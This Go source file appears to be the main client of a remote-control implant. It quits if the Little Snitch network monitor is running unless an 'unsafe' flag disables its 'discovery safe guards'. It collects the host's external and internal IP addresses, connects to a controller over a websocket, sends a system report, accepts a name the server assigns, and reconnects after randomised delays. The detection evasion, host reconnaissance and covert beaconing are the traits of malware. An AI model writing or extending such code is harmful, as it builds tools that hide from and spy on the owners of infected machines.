package main

import (
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"time"

	"github.com/mikeflynn/the-fearsome-five/shared"
	ps "github.com/mitchellh/go-ps"
)

var verbose *bool

func Debug(message string) {
	if *verbose == true {
		log.Println(message)
	}
}

func GetServer(server string) string {
	addr := url.URL{
		Scheme: "ws",
		Host:   fmt.Sprintf("%s", server),
		Path:   "/c",
	}

	return addr.String()
}

func processRunning(term string) bool {
	procList, err := ps.Processes()
	if err != nil {
		Debug("Process list fetch failed.")
		return false
	}

	for _, p := range procList {
		if strings.Contains(p.Executable(), term) {
			return true
		}
	}

	return false
}

func main() {
	server := flag.String("server", "localhost:8000", "Server hostname.")
	verboseFlag := flag.Bool("verbose", false, "Additional debugging logs.")
	unsafe := flag.Bool("unsafe", false, "Turn off all discovery safe guards.")
	retryDelay := flag.Int("delay", 300, "Delay, in seconds, before reconnection attempts.")

	flag.Parse()

	verbose = verboseFlag
	shared.Logger = Debug

	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)

	system := InitSystem()

	// Is it OK to run on this machine?
	if !*unsafe && processRunning("Little Snitch") {
		Debug("Monitoring program found. Shutting down.")
		os.Exit(0)
	}

	if _, err := system.GetExternalIP(true); err != nil {
		// Getting blocked?
		os.Exit(0)
	}
	system.GetInternalIP()

	connection := shared.InitConnection()

	defer connection.Close()

	connection.ReadCallback = func(conn *shared.Conn, message *shared.Message) {
		switch message.Action {
		case "setName":
			system.UUID = message.Body
		default:
			// Ignore
			Debug("Unroutable message: " + string(message.Serialize()))
			return
		}
	}

	go func() {
		for {
			Debug("Checking connection...")
			if connection.Establish(GetServer(*server)) {
				go connection.WritePump()
				go connection.ReadPump()

				// Send the system report
				connection.Send(shared.NewMessage("systemReport", system.toJSON(), shared.EncodingJSON))
			}

			time.Sleep(time.Duration(*retryDelay*rand.Intn(*retryDelay)) * time.Second)
		}
	}()

	for {
		select {
		case <-interrupt:
			Debug("INTERRUPT!")
			connection.Close()
			os.Exit(0)
		}
	}
}
